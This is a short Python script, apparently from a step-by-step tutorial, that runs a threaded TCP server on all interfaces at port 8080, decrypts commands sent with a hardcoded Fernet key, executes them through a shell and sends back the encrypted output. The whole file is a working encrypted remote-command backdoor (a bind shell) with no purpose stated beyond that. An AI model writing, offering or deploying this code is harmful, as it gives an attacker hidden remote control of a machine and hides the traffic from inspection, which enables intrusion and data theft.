import socket
import threading
import time
import subprocess
from cryptography.fernet import Fernet

# REPLACE WITH YOUR KEY FROM STEP 3
KEY = b'9NwSfijmfS35Y9LLkjAh8o8XG5ehc5XZiL4t-IEfPMQ='
cipher = Fernet(KEY)

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            
            cmd = cipher.decrypt(data).decode()
            result = run_command(cmd)
            conn.send(cipher.encrypt(result.encode()))
        except Exception as e:
            conn.send(cipher.encrypt(str(e).encode()))
            break
    conn.close()

def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

def main():
    host = '0.0.0.0'
    port = 8080
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f"[*] Listening on {host}:{port}")
    
    while True:
        client, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(client, addr))
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    main()